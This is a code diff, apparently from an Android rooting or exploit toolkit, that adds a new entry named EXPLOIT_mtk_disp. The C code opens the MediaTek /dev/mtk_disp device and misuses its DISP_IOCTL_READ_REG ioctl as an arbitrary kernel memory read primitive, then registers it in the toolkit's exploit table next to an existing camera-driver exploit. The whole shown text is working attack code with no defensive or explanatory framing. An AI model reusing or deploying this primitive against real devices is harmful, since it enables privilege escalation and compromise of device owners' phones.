@@ -260,3 +260,55 @@ exploit_t EXPLOIT_mtk_camera_fl = {
     .invoke = mtk_camera_fl_invoke,
     .free = mtk_camera_fl_free,
 };
+
+#define DISP_IOCTL_MAGIC        'x'
+#define DISP_IOCTL_READ_REG        _IOWR    (DISP_IOCTL_MAGIC, 2, DISP_READ_REG)
+
+typedef struct {
+    unsigned int reg;
+    unsigned int *val;
+    unsigned int mask;
+} DISP_READ_REG;
+
+static int mtk_disp_init(void **opaque) {
+    int fd;
+
+    *opaque = (void *) -1;
+    fd = open("/dev/mtk_disp", O_RDONLY);
+    if (fd < 0)
+        return -1;
+    *opaque = (void *) fd;
+    return 0;
+}
+
+static int mtk_disp_read32(void *opaque, long addr, long *val) {
+    int rc, fd;
+    DISP_READ_REG args;
+    unsigned int tmp = 0;
+
+    fd = (int) opaque;
+    args.reg = addr;
+    args.val = &tmp;
+    args.mask = (unsigned int) -1;
+    rc = ioctl(fd, DISP_IOCTL_READ_REG, &args);
+    if (rc < 0)
+        return rc;
+    *val = (long) tmp;
+    return 0;
+}
+
+static void mtk_disp_free(void **opaque) {
+    int fd;
+
+    fd = (int)(*opaque);
+    if (fd >= 0)
+        close(fd);
+    *opaque = (void *) 0;
+}
+
+exploit_t EXPLOIT_mtk_disp = {
+    .name = "MTK mtk_disp",
+    .init = mtk_disp_init,
+    .free = mtk_disp_free,
+    .read32 = mtk_disp_read32,
+};
